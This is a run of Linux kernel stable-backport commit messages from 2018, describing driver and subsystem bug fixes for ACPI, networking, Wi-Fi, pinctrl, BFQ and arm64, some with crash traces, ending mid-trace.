Date: Mon Aug 27 09:45:44 2018 +0200
ACPI / LPSS: Add alternative ACPI HIDs for Cherry Trail DMA controllers
[ Upstream commit 240714061c58e6b1abfb3322398a7634151c06cb ]
Bay and Cherry Trail DSTDs represent a different set of devices depending
on which OS the device think it is booting. One set of decices for Windows
and another set of devices for Android which targets the Android-x86 Linux
kernel fork (which e.g. used to have its own display driver instead of
using the i915 driver).
Which set of devices we are actually going to get is out of our control,
this is controlled by the ACPI OSID variable, which gets either set through
an EFI setup option, or sometimes is autodetected. So we need to support
both.
This commit adds support for the 80862286 and 808622C0 ACPI HIDs which we
get for the first resp. second DMA controller on Cherry Trail devices when
OSID is set to Android.
Signed-off-by: Hans de Goede
Reviewed-by: Andy Shevchenko
Signed-off-by: Rafael J. Wysocki
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit d70f08ad016276d2f8bc1eb119c2986c7e55c422
Author: Linus Walleij
Date: Mon Sep 10 00:28:05 2018 +0200
spi: gpio: No MISO does not imply no RX
[ Upstream commit abf5feef3ff0cefade0c76be53b59e55fdd46093 ]
There is a logical problem in spi-gpio with host just
assigning a MOSI line and no MISO: this is interpreted
as the host cannot do RX and the host is flagged with
SPI\_MASTER\_NO\_RX.
This is wrong: since GPIO lines can switch direction,
in 3WIRE operation the host will simply reverse the
direction of the GPIO line and start reading from it,
there is even code for doing this in the driver, but
it went unnoticed because it was tested by using a
master with 4 wires but a device using just 3 wires.
Remove the offending flag.
Cc: Andrzej Hajda
Cc: Lorenzo Bianconi
Signed-off-by: Linus Walleij
Signed-off-by: Mark Brown
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit e67ec9ef7925eb153a531265e71d36bead1b0f5c
Author: Masami Hiramatsu
Date: Tue Sep 11 19:20:40 2018 +0900
kprobes: Return error if we fail to reuse kprobe instead of BUG\_ON()
[ Upstream commit 819319fc93461c07b9cdb3064f154bd8cfd48172 ]
Make reuse\_unused\_kprobe() to return error code if
it fails to reuse unused kprobe for optprobe instead
of calling BUG\_ON().
Signed-off-by: Masami Hiramatsu
Cc: Anil S Keshavamurthy
Cc: David S . Miller
Cc: Linus Torvalds
Cc: Naveen N . Rao
Cc: Peter Zijlstra
Cc: Thomas Gleixner
Link: http://lkml.kernel.org/r/153666124040.21306.14150398706331307654.stgit@devbox
Signed-off-by: Ingo Molnar
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 7a035a98f1b37451c9a5c7fb93eb6d2ec0d8faa5
Author: Will Deacon
Date: Tue Aug 7 13:43:06 2018 +0100
arm64: entry: Allow handling of undefined instructions from EL1
[ Upstream commit 0bf0f444b2c49241b2b39aa3cf210d7c95ef6c34 ]
Rather than panic() when taking an undefined instruction exception from
EL1, allow a hook to be registered in case we want to emulate the
instruction, like we will for the SSBS PSTATE manipulation instructions.
Signed-off-by: Will Deacon
Signed-off-by: Catalin Marinas
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit ae9fc312a6d85a7b6efef0ac554152e75d163e66
Author: Paolo Valente
Date: Fri Sep 14 16:23:07 2018 +0200
block, bfq: correctly charge and reset entity service in all cases
[ Upstream commit cbeb869a3d1110450186b738199963c5e68c2a71 ]
BFQ schedules entities (which represent either per-process queues or
groups of queues) as a function of their timestamps. In particular, as
a function of their (virtual) finish times. The finish time of an
entity is computed as a function of the budget assigned to the entity,
assuming, tentatively, that the entity, once in service, will receive
an amount of service equal to its budget. Then, when the entity is
expired because it finishes to be served, this finish time is updated
as a function of the actual service received by the entity. This
allows the entity to be correctly charged with only the service
received, and then to be correctly re-scheduled.
Yet an entity may receive service also while not being the entity in
service (in the scheduling environment of its parent entity), for
several reasons. If the entity remains with no backlog while receiving
this 'unofficial' service, then it is expired. Also on such an
expiration, the finish time of the entity should be updated to account
for only the service actually received by the entity. Unfortunately,
such an update is not performed for an entity expiring without being
the entity in service.
In a similar vein, the service counter of the entity in service is
reset when the entity is expired, to be ready to be used for next
service cycle. This reset too should be performed also in case an
entity is expired because it remains empty after receiving service
while not being the entity in service. But in this case the reset is
not performed.
This commit performs the above update of the finish time and reset of
the service received, also for an entity expiring while not being the
entity in service.
Signed-off-by: Paolo Valente
Signed-off-by: Jens Axboe
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 3f353034eaf75a9d88e54d0a97646d4406c57c8c
Author: Antoine Tenart
Date: Wed Sep 19 11:39:31 2018 +0200
net: phy: phylink: ensure the carrier is off when starting phylink
[ Upstream commit aeeb2e8fdefdd5d257a1446351c70cb3df540199 ]
Phylink made an assumption about the carrier state being down when
calling phylink\_start(). If this assumption isn't satisfied, the
internal phylink state could misbehave and a net device could end up not
being functional.
This patch fixes this by explicitly calling netif\_carrier\_off() in
phylink\_start().
Signed-off-by: Antoine Tenart
Acked-by: Russell King
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 4ac72411c7b4bb40839ce80acdd787de863fa1c6
Author: Fuyun Liang
Date: Wed Sep 19 18:29:52 2018 +0100
net: hns3: Set STATE\_DOWN bit of hdev state when stopping net
[ Upstream commit 2f7e489611bc685b8e00aba436032a8aac6cac57 ]
We clear STATE\_DOWN bit of hdev state when starting net, but do not set
it again when stopping net. It causes that the net is down, but hdev state
is still up. STATE\_DOWN bit of hdev state should be set when stopping net.
Fixes: 46a3df9f9718 ("net: hns3: Add HNS3 Acceleration Engine & Compatibility Layer Support")
Fixes: e2cb1dec9779 ("net: hns3: Add HNS3 VF HCL(Hardware Compatibility Layer) Support")
Signed-off-by: Fuyun Liang
Signed-off-by: Peng Li
Signed-off-by: Salil Mehta
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 110bdc65290450ce4ce5807abf626a986b795253
Author: Peng Li
Date: Wed Sep 19 18:29:53 2018 +0100
net: hns3: Check hdev state when getting link status
[ Upstream commit 582d37bbb613b8ad86bf82845d3a74a02a5a0fa1 ]
By default, HW link status is up. If hclge\_update\_link\_status is called
before net up, driver will print "link up". It is not suitable. hdev
state check is needed when getting link status.
Fixes: 46a3df9f9718 ("net: hns3: Add HNS3 Acceleration Engine & Compatibility Layer Support")
Fixes: e2cb1dec9779 ("net: hns3: Add HNS3 VF HCL(Hardware Compatibility Layer) Support")
Signed-off-by: Fuyun Liang
Signed-off-by: Peng Li
Signed-off-by: Salil Mehta
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit a0f6b282ca7812fb5232e7fb7c1038602512d6d7
Author: Arend van Spriel
Date: Wed Sep 5 09:48:58 2018 +0200
brcmfmac: fix for proper support of 160MHz bandwidth
[ Upstream commit 330994e8e8ec5d0b269a5265e6032b37e29aa336 ]
Decoding of firmware channel information was not complete for 160MHz
support. This resulted in the following warning:
WARNING: CPU: 2 PID: 2222 at .../broadcom/brcm80211/brcmutil/d11.c:196
brcmu\_d11ac\_decchspec+0x2e/0x100 [brcmutil]
Modules linked in: brcmfmac(O) brcmutil(O) sha256\_generic cfg80211 ...
CPU: 2 PID: 2222 Comm: kworker/2:0 Tainted: G O
4.17.0-wt-testing-x64-00002-gf1bed50 #1
Hardware name: Dell Inc. Latitude E6410/07XJP9, BIOS A07 02/15/2011
Workqueue: events request\_firmware\_work\_func
RIP: 0010:brcmu\_d11ac\_decchspec+0x2e/0x100 [brcmutil]
RSP: 0018:ffffc90000047bd0 EFLAGS: 00010206
RAX: 000000000000e832 RBX: ffff8801146fe910 RCX: ffff8801146fd3c0
RDX: 0000000000002800 RSI: 0000000000000070 RDI: ffffc90000047c30
RBP: ffffc90000047bd0 R08: 0000000000000000 R09: ffffffffa0798c80
R10: ffff88012bca55e0 R11: ffff880110a4ea00 R12: ffff8801146f8000
R13: ffffc90000047c30 R14: ffff8801146fe930 R15: ffff8801138e02e0
FS: 0000000000000000(0000) GS:ffff88012bc80000(0000) knlGS:0000000000000000
CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00007f18ce8b8070 CR3: 000000000200a003 CR4: 00000000000206e0
Call Trace:
brcmf\_setup\_wiphybands+0x212/0x780 [brcmfmac]
brcmf\_cfg80211\_attach+0xae2/0x11a0 [brcmfmac]
brcmf\_attach+0x1fc/0x4b0 [brcmfmac]
? \_\_kmalloc+0x13c/0x1c0
brcmf\_pcie\_setup+0x99b/0xe00 [brcmfmac]
brcmf\_fw\_request\_done+0x16a/0x1f0 [brcmfmac]
request\_firmware\_work\_func+0x36/0x60
process\_one\_work+0x146/0x350
worker\_thread+0x4a/0x3b0
kthread+0x102/0x140
? process\_one\_work+0x350/0x350
? kthread\_bind+0x20/0x20
ret\_from\_fork+0x35/0x40
Code: 66 90 0f b7 07 55 48 89 e5 89 c2 88 47 02 88 47 03 66 81 e2 00 38
66 81 fa 00 18 74 6e 66 81 fa 00 20 74 39 66 81 fa 00 10 74 14 <0f>
0b 66 25 00 c0 74 20 66 3d 00 c0 75 20 c6 47 04 01 5d c3 66
---[ end trace 550c46682415b26d ]---
brcmfmac: brcmf\_construct\_chaninfo: Ignoring unexpected firmware channel 50
This patch adds the missing stuff to properly handle this.
Reviewed-by: Hante Meuleman
Reviewed-by: Pieter-Paul Giesberts
Reviewed-by: Franky Lin
Signed-off-by: Arend van Spriel
Signed-off-by: Kalle Valo
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 2cd3b487ff72d74a7dd042a523a994c6ac182a13
Author: YueHaibing
Date: Thu Sep 20 01:58:18 2018 +0000
pinctrl: qcom: spmi-mpp: Fix err handling of pmic\_mpp\_set\_mux
[ Upstream commit 69f8455f6cc78fa6cdf80d0105d7a748106271dc ]
'ret' should be returned while pmic\_mpp\_write\_mode\_ctl fails.
Fixes: 0e948042c420 ("pinctrl: qcom: spmi-mpp: Implement support for sink mode")
Signed-off-by: YueHaibing
Signed-off-by: Linus Walleij
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit fae41efdcdb6da25dbb41a8520c3270fb8064613
Author: YueHaibing
Date: Fri Sep 21 09:59:41 2018 +0800
pinctrl: sunxi: fix 'pctrl->functions' allocation in sunxi\_pinctrl\_build\_state
[ Upstream commit a4925311a5443126ecc90671a1604ea7b0f5b32e ]
fixes following Smatch static check warning:
./drivers/pinctrl/sunxi/pinctrl-sunxi.c:1112 sunxi\_pinctrl\_build\_state()
warn: passing devm\_ allocated variable to kfree. 'pctrl->functions'
As we will be calling krealloc() on pointer 'pctrl->functions', which means
kfree() will be called in there, devm\_kzalloc() shouldn't be used with
the allocation in the first place. Fix the warning by calling kcalloc()
and managing the free procedure in error path on our own.
Fixes: 0e37f88d9ad8 ("ARM: sunxi: Add pinctrl driver for Allwinner SoCs")
Signed-off-by: YueHaibing
Acked-by: Maxime Ripard
Signed-off-by: Linus Walleij
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 7458126fbbf30dbe5d986fa8950949a67bb75714
Author: Jian Shen
Date: Fri Sep 21 16:41:37 2018 +0100
net: hns3: Fix ets validate issue
[ Upstream commit adefc0a2ff465f4ac4a88450fe69d336c8b074c5 ]
There is a defect in hclge\_ets\_validate(). If each member of tc\_tsa is
not IEEE\_8021QAZ\_TSA\_ETS, the variable total\_ets\_bw won't be updated.
In this case, the check for value of total\_ets\_bw will fail. This patch
fixes it by checking total\_ets\_bw only after it has been updated.
Fixes: cacde272dd00 ("net: hns3: Add hclge\_dcb module for the support of DCB feature")
Signed-off-by: Jian Shen
Signed-off-by: Peng Li
Signed-off-by: Salil Mehta
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit e0d9799dffb125de33e3651475548fe51c01fa2b
Author: Jian Shen
Date: Fri Sep 21 16:41:43 2018 +0100
net: hns3: Add nic state check before calling netif\_tx\_wake\_queue
[ Upstream commit 7a8101109dd37837f587cd56f3111d4fc17a07f5 ]
When nic down, it firstly calls netif\_tx\_stop\_all\_queues(), then calls
napi\_disable(). But napi\_disable() will wait current napi\_poll finish,
it may call netif\_tx\_wake\_queue(). This patch fixes it by add nic state
checking.
Fixes: 424eb834a9be ("net: hns3: Unified HNS3 {VF|PF} Ethernet Driver for hip08 SoC")
Signed-off-by: Jian Shen
Signed-off-by: Peng Li
Signed-off-by: Salil Mehta
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 9fae4092be8bbee1c771f3b9d62ae7bd43591ee3
Author: Ben Hutchings
Date: Sun Sep 16 16:22:47 2018 +0100
x86: boot: Fix EFI stub alignment
[ Upstream commit 9c1442a9d039a1a3302fa93e9a11001c5f23b624 ]
We currently align the end of the compressed image to a multiple of
16. However, the PE-COFF header included in the EFI stub says that
the file alignment is 32 bytes, and when adding an EFI signature to
the file it must first be padded to this alignment.
sbsigntool commands warn about this:
warning: file-aligned section .text extends beyond end of file
warning: checksum areas are greater than image size. Invalid section table?
Worse, pesign -at least when creating a detached signature- uses the
hash of the unpadded file, resulting in an invalid signature if
padding is required.
Avoid both these problems by increasing alignment to 32 bytes when
CONFIG\_EFI\_STUB is enabled.
Signed-off-by: Ben Hutchings
Signed-off-by: Ard Biesheuvel
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 249af5d524862055f8cec063f82468244cdf7653
Author: Christian Hewitt
Date: Tue Sep 4 21:50:57 2018 +0400
Bluetooth: btbcm: Add entry for BCM4335C0 UART bluetooth
[ Upstream commit a357ea098c9605f60d92a66a9073f56ce25726da ]
This patch adds the device ID for the AMPAK AP6335 combo module used
in the 1st generation WeTek Hub Android/LibreELEC HTPC box. The WiFI
chip identifies itself as BCM4339, while Bluetooth identifies itself
as BCM4335 (rev C0):
```
[ 4.864248] Bluetooth: hci0: BCM: chip id 86
[ 4.866388] Bluetooth: hci0: BCM: features 0x2f
[ 4.889317] Bluetooth: hci0: BCM4335C0
[ 4.889332] Bluetooth: hci0: BCM4335C0 (003.001.009) build 0000
[ 9.778383] Bluetooth: hci0: BCM4335C0 (003.001.009) build 0268
```
Output from hciconfig:
```
hci0: Type: Primary Bus: UART
BD Address: 43:39:00:00:1F:AC ACL MTU: 1021:8 SCO MTU: 64:1
UP RUNNING
RX bytes:7567 acl:234 sco:0 events:386 errors:0
TX bytes:53844 acl:77 sco:0 commands:304 errors:0
Features: 0xbf 0xfe 0xcf 0xfe 0xdb 0xff 0x7b 0x87
Packet type: DM1 DM3 DM5 DH1 DH3 DH5 HV1 HV2 HV3
Link policy: RSWITCH SNIFF
Link mode: SLAVE ACCEPT
Name: 'HUB'
Class: 0x0c0000
Service Classes: Rendering, Capturing
Device Class: Miscellaneous,
HCI Version: 4.0 (0x6) Revision: 0x10c
LMP Version: 4.0 (0x6) Subversion: 0x6109
Manufacturer: Broadcom Corporation (15)
```
Signed-off-by: Christian Hewitt
Signed-off-by: Marcel Holtmann
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit f8ec431379a57e06231d99baebe0b65db68c48ce
Author: Yunsheng Lin
Date: Wed Sep 26 19:28:36 2018 +0100
net: hns3: Fix for packet buffer setting bug
[ Upstream commit 996ff91840eb6f288826e472685abde78bac20ea ]
The hardware expects a unit of 128 bytes when setting
packet buffer. When calculating the packet buffer size,
hclge\_rx\_buffer\_calc does not round up the size as a unit
of 128 byte, which may casue packet lost problem when stress
testing.
This patch fixes it by rounding up packet size when calculating.
Fixes: 46a3df9f9718 ("net: hns3: Add HNS3 Acceleration Engine & Compatibility Layer Support")
Signed-off-by: Yunsheng Lin
Signed-off-by: Peng Li
Signed-off-by: Salil Mehta
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 9ffa5136a36b0c1e3e867c51ab2f5d0f5d101d5a
Author: Jacob Keller
Date: Wed Sep 19 17:23:07 2018 -0700
ice: update fw version check logic
[ Upstream commit 396fbf9cab5dc07f8f87773062a8d35f54b40a05 ]
We have MAX\_FW\_API\_VER\_BRANCH, MAX\_FW\_API\_VER\_MAJOR, and
MAX\_FW\_API\_VER\_MINOR that we use in ice\_controlq.h to test when a
firmware version is newer than expected. This is currently tested by
comparing each field separately. Thus, we compare the branch field
against the MAX\_FW\_API\_VER\_BRANCH, and so forth.
This means that currently, if we suppose that the max firmware version
is defined as 0.2.1, i.e.
Then firmware 0.1.3 will fail to load. This is because the minor version
3 is greater than the max minor version 1.
This is not intuitive, because of the notion that increasing the major
firmware version to 2 should mean any firmware version with a major
version is less than 2 should be considered older than 2...
In order to allow both 0.2.1 and 0.1.3 to load, you would have to define
the "max" firmware version as 0.2.3.. It is possible that such
a firmware version doesn't even exist yet!
Fix this by replacing the current logic with an updated check that
behaves as follows:
First, we check the major version. If it is greater than the expected
version, then we prevent driver load. Additionally, a warning message is
logged to indicate to the system administrator that they need to update
their driver. This is now the only case where the driver will refuse to
load.
Second, if the major version is less than the expected version, we log
an information message indicating the NVM should be updated.
Third, if the major version is exact, we'll then check the minor
version. If the minor version is more than two versions less than
expected, we log an information message indicating the NVM should be
updated. If it is more than two versions greater than the expected
version, we log an information message that the driver should be
updated.
To support this, the ice\_aq\_ver\_check function needs its signature
updated to pass the HW structure. Since we now pass this structure,
there is no need to pass the firmware API versions separately.
Signed-off-by: Jacob Keller
Signed-off-by: Anirudh Venkataramanan
Tested-by: Andrew Bowers
Signed-off-by: Jeff Kirsher
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 345e47a7dfc2117b9b8e89875cc64a2f52e1511c
Author: Bruce Allan
Date: Wed Sep 19 17:23:11 2018 -0700
ice: fix changing of ring descriptor size (ethtool -G)
[ Upstream commit f934bb9b8b6136edd261b2dc2c9ad4dbc39ffc66 ]
rx\_mini\_pending was set to an incorrect value. This was causing EINVAL to
always be returned to 'ethtool -G'. The driver does not support mini or
jumbo rings so the respective settings should be zero.
Also, change the valid range of the number of descriptors in the rings to
make the code simpler and easier for users to understand (this removes the
valid settings of 8 and 16). Add a system log message indicating when the
number is rounded-up from what the user specifies with the 'ethtool -G'
command (i.e. when it is not a multiple of 32), and update the log message
when a user-provided value is out of range to also indicate the stride.
Signed-off-by: Bruce Allan
Signed-off-by: Anirudh Venkataramanan
Tested-by: Andrew Bowers
Signed-off-by: Jeff Kirsher
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit e7a23fd7c189ffa0f4f5afc41f833e898131a569
Author: Will Deacon
Date: Wed Sep 5 15:34:42 2018 +0100
signal: Introduce COMPAT\_SIGMINSTKSZ for use in compat\_sys\_sigaltstack
[ Upstream commit 22839869f21ab3850fbbac9b425ccc4c0023926f ]
The sigaltstack(2) system call fails with -ENOMEM if the new alternative
signal stack is found to be smaller than SIGMINSTKSZ. On architectures
such as arm64, where the native value for SIGMINSTKSZ is larger than
the compat value, this can result in an unexpected error being reported
to a compat task. See, for example:
https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=904385
This patch fixes the problem by extending do\_sigaltstack to take the
minimum signal stack size as an additional parameter, allowing the
native and compat system call entry code to pass in their respective
values. COMPAT\_SIGMINSTKSZ is just defined as SIGMINSTKSZ if it has not
been defined by the architecture.
Cc: Arnd Bergmann
Cc: Dominik Brodowski
Cc: "Eric W. Biederman"
Cc: Andrew Morton
Cc: Al Viro
Cc: Oleg Nesterov
Reported-by: Steve McIntyre
Tested-by: Steve McIntyre <93sam@debian.org>
Signed-off-by: Will Deacon
Signed-off-by: Catalin Marinas
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 0f1f598722040afc7c1872ff81feef6c801baa8a
Author: Gustavo A. R. Silva
Date: Tue Sep 18 08:55:55 2018 -0500
mtd: rawnand: atmel: Fix potential NULL pointer dereference
[ Upstream commit fbed20280d912449cfb40c382cb55e3d11502587 ]
There is a potential execution path in which function
of\_find\_compatible\_node() returns NULL. In such a case,
we end up having a NULL pointer dereference when accessing
pointer \*nfc\_np\* in function of\_clk\_get().
So, we better don't take any chances and fix this by null
checking pointer \*nfc\_np\* before calling of\_clk\_get().
Addresses-Coverity-ID: 1473052 ("Dereference null return value")
Fixes: f88fc122cc34 ("mtd: nand: Cleanup/rework the atmel\_nand driver")
Signed-off-by: Gustavo A. R. Silva
Reviewed-by: Boris Brezillon
Acked-by: Tudor Ambarus
Signed-off-by: Miquel Raynal
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit e8c9540b02ce7023d9d8ec4066636794961ddab8
Author: Xiaochen Shen
Date: Wed Sep 12 16:48:38 2018 -0700
x86/intel\_rdt: Show missing resctrl mount options
[ Upstream commit 2cc81c6992248ea37d0241bc325977bab310bc3b ]
In resctrl filesystem, mount options exist to enable L3/L2 CDP and MBA
Software Controller features if the platform supports them:
mount -t resctrl resctrl [-o cdp[,cdpl2][,mba\_MBps]] /sys/fs/resctrl
But currently only "cdp" option is displayed in /proc/mounts. "cdpl2" and
"mba\_MBps" options are not shown even when they are active.
Before:
# mount -t resctrl resctrl -o cdp,mba\_MBps /sys/fs/resctrl
# grep resctrl /proc/mounts
/sys/fs/resctrl /sys/fs/resctrl resctrl rw,relatime,cdp 0 0
After:
# mount -t resctrl resctrl -o cdp,mba\_MBps /sys/fs/resctrl
# grep resctrl /proc/mounts
/sys/fs/resctrl /sys/fs/resctrl resctrl rw,relatime,cdp,mba\_MBps 0 0
Signed-off-by: Xiaochen Shen
Signed-off-by: Fenghua Yu
Signed-off-by: Thomas Gleixner
Cc: "H Peter Anvin"
Cc: "Tony Luck"
Link: https://lkml.kernel.org/r/1536796118-60135-1-git-send-email-fenghua.yu@intel.com
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 0efa31256ace12485bc49d53917f600bb4a108b5
Author: Viresh Kumar
Date: Wed Oct 3 15:35:21 2018 +0530
cpufreq: dt: Try freeing static OPPs only if we have added them
[ Upstream commit 51c99dd2c06b234575661fa1e0a1dea6c3ef566f ]
We can not call dev\_pm\_opp\_of\_cpumask\_remove\_table() freely anymore
since the latest OPP core updates as that uses reference counting to
free resources. There are cases where no static OPPs are added (using
DT) for a platform and trying to remove the OPP table may end up
decrementing refcount which is already zero and hence generating
warnings.
Lets track if we were able to add static OPPs or not and then only
remove the table based on that. Some reshuffling of code is also done to
do that.
Reported-by: Niklas Cassel
Tested-by: Niklas Cassel
Signed-off-by: Viresh Kumar
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 17b8bb13ac9ddc1b2d3b60950563f83b31b2a71c
Author: Dou Liyang
Date: Fri Aug 24 10:51:26 2018 +0800
ACPI / processor: Fix the return value of acpi\_processor\_ids\_walk()
[ Upstream commit d0381bf4f80c571dde1244fe5b85dc35e8b3f546 ]
ACPI driver should make sure all the processor IDs in their ACPI Namespace
are unique. the driver performs a depth-first walk of the namespace tree
and calls the acpi\_processor\_ids\_walk() to check the duplicate IDs.
But, the acpi\_processor\_ids\_walk() mistakes the return value. If a
processor is checked, it returns true which causes the walk break
immediately, and other processors will never be checked.
Repace the value with AE\_OK which is the standard acpi\_status value.
And don't abort the namespace walk even on error.
Fixes: 8c8cb30f49b8 (acpi/processor: Implement DEVICE operator for processor enumeration)
Signed-off-by: Dou Liyang
Signed-off-by: Rafael J. Wysocki
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit dcb2a7c2146936396cef75d332df3b3746a165ec
Author: Rajneesh Bhardwaj
Date: Fri Sep 28 14:24:02 2018 +0530
ACPI / PM: LPIT: Register sysfs attributes based on FADT
[ Upstream commit 1cdda9486f5103fb133f88e662e48c504adbb779 ]
ACPI Low Power S0 Idle capabilities are announced via FADT table and can
be used to inform the kernel about the presence of one or more Low Power
Idle (LPI) entries as descried in LPIT table. LPIT table can exist
independently even if the FADT S0 Idle flag is not set and thus it could
confuse user since the following cpuidle attributes are created.
/sys/devices/system/cpu/cpuidle/low\_power\_idle\_cpu\_residency\_us
/sys/devices/system/cpu/cpuidle/low\_power\_idle\_system\_residency\_us
Presence or absence of above attributes could mean that the given
platform supports S0ix state or not.
This change allows to create the above cpuidle attributes only if
FADT table supports Low Power S0 Idle.
Signed-off-by: Rajneesh Bhardwaj
Signed-off-by: Rafael J. Wysocki
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 9c7247b6f6a96ee5a5f1db8570a510ac7eabf8a0
Author: Jeffrey Hugo
Date: Thu Oct 4 09:20:06 2018 -0600
ACPI/PPTT: Handle architecturally unknown cache types
[ Upstream commit 59bbff3775c0951300f7b41345a54b999438f8d0 ]
The type of a cache might not be specified by architectural mechanisms (ie
system registers), but its type might be specified in the PPTT. In this
case, we should populate the type of the cache, rather than leave it
undefined.
This fixes the issue where the cacheinfo driver will not populate sysfs
for such caches, resulting in the information missing from utilities like
lstopo and lscpu, thus degrading the user experience.
Fixes: 2bd00bcd73e5 (ACPI/PPTT: Add Processor Properties Topology Table parsing)
Reported-by: Vijaya Kumar K
Signed-off-by: Jeffrey Hugo
Reviewed-by: Sudeep Holla
Signed-off-by: Rafael J. Wysocki
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit ef9c7ed4de607bf17e0cc9a25e727b274b219a52
Author: Lubomir Rintel
Date: Thu Oct 4 18:08:08 2018 +0200
x86/olpc: Indicate that legacy PC XO-1 platform should not register RTC
[ Upstream commit d92116b800fb79a72ad26121f5011f6aa3ad94c2 ]
On OLPC XO-1, the RTC is discovered via device tree from the arch
initcall. Don't let the PC platform register another one from its device
initcall, it's not going to work:
sysfs: cannot create duplicate filename '/devices/platform/rtc\_cmos'
CPU: 0 PID: 1 Comm: swapper Not tainted 4.19.0-rc6 #12
Hardware name: OLPC XO/XO, BIOS OLPC Ver 1.00.01 06/11/2014
Call Trace:
dump\_stack+0x16/0x18
sysfs\_warn\_dup+0x46/0x58
sysfs\_create\_dir\_ns+0x76/0x9b
kobject\_add\_internal+0xed/0x209
? \_\_schedule+0x3fa/0x447
kobject\_add+0x5b/0x66
device\_add+0x298/0x535
? insert\_resource\_conflict+0x2a/0x3e
platform\_device\_add+0x14d/0x192
? io\_delay\_init+0x19/0x19
platform\_device\_register+0x1c/0x1f
add\_rtc\_cmos+0x16/0x31
do\_one\_initcall+0x78/0x14a
? do\_early\_param+0x75/0x75
kernel\_init\_freeable+0x152/0x1e0
? rest\_init+0xa2/0xa2
kernel\_init+0x8/0xd5
ret\_from\_fork+0x2e/0x38
kobject\_add\_internal failed for rtc\_cmos with -EEXIST, don't try to
register things with the same name in the same directory.
platform rtc\_cmos: registered platform RTC device (no PNP device found)
Signed-off-by: Lubomir Rintel
Signed-off-by: Borislav Petkov
Acked-by: Thomas Gleixner
CC: "H. Peter Anvin"
CC: Ingo Molnar
CC: x86-ml
Link: http://lkml.kernel.org/r/20181004160808.307738-1-lkundrak@v3.sk
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit f7121de89b55224d51b3044949d4bedecc612c13
Author: Luca Coelho
Date: Mon Jun 11 11:15:17 2018 +0300
iwlwifi: mvm: check for n\_profiles validity in EWRD ACPI
[ Upstream commit 2e1976bb75263fbad918e82184b16a23bd721546 ]
When reading the profiles from the EWRD table in ACPI, we loop over
the data and set it into our internal table. We use the number of
profiles specified in ACPI without checking its validity, so if the
ACPI table is corrupted and the number is larger than our array size,
we will try to make an out-of-bounds access.
Fix this by making sure the value specified in the ACPI table is
valid.
Fixes: 6996490501ed ("iwlwifi: mvm: add support for EWRD (Dynamic SAR) ACPI table")
Signed-off-by: Luca Coelho
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit af0d1438f4e2fd7015619d81c99cd8681953ee7b
Author: Emmanuel Grumbach
Date: Wed Jun 13 11:49:20 2018 +0300
iwlwifi: mvm: clear HW\_RESTART\_REQUESTED when stopping the interface
[ Upstream commit 155f7e0441cd121b1e673d465a35e99f4b9b2f0b ]
Fix a bug that happens in the following scenario:
1) suspend without WoWLAN
2) mac80211 calls drv\_stop because of the suspend
3) \_\_iwl\_mvm\_mac\_stop deallocates the aux station
4) during drv\_stop the firmware crashes
5) iwlmvm:
\* sets IWL\_MVM\_STATUS\_HW\_RESTART\_REQUESTED
\* asks mac80211 to kick the restart flow
6) mac80211 puts the restart worker into a freezable
queue which means that the worker will not run for now
since the workqueue is already frozen
7) ...
8) resume
9) mac80211 runs ieee80211\_reconfig as part of the resume
10) mac80211 detects that a restart flow has been requested
and that we are now resuming from suspend and cancels
the restart worker
11) mac80211 calls drv\_start()
12) \_\_iwl\_mvm\_mac\_start checks that IWL\_MVM\_STATUS\_HW\_RESTART\_REQUESTED
clears it, sets IWL\_MVM\_STATUS\_IN\_HW\_RESTART and calls
iwl\_mvm\_restart\_cleanup()
13) iwl\_fw\_error\_dump gets called and accesses the device
to get debug data
14) iwl\_mvm\_up adds the aux station
15) iwl\_mvm\_add\_aux\_sta() allocates an internal station for
the aux station
16) iwl\_mvm\_allocate\_int\_sta() tests IWL\_MVM\_STATUS\_IN\_HW\_RESTART
and doesn't really allocate a station ID for the aux
station
17) a new queue is added for the aux station
Note that steps from 5 to 9 aren't really part of the
problem but were described for the sake of completeness.
Once the iwl\_mvm\_mac\_stop() is called, the device is not
accessible, meaning that step 12) can't succeed and we'll
see the following:
drivers/net/wireless/intel/iwlwifi/pcie/trans.c:2122 iwl\_trans\_pcie\_grab\_nic\_access+0xc0/0x1d6 [iwlwifi]()
Timeout waiting for hardware access (CSR\_GP\_CNTRL 0x080403d8)
Call Trace:
[] iwl\_trans\_pcie\_grab\_nic\_access+0xc0/0x1d6 [iwlwifi]
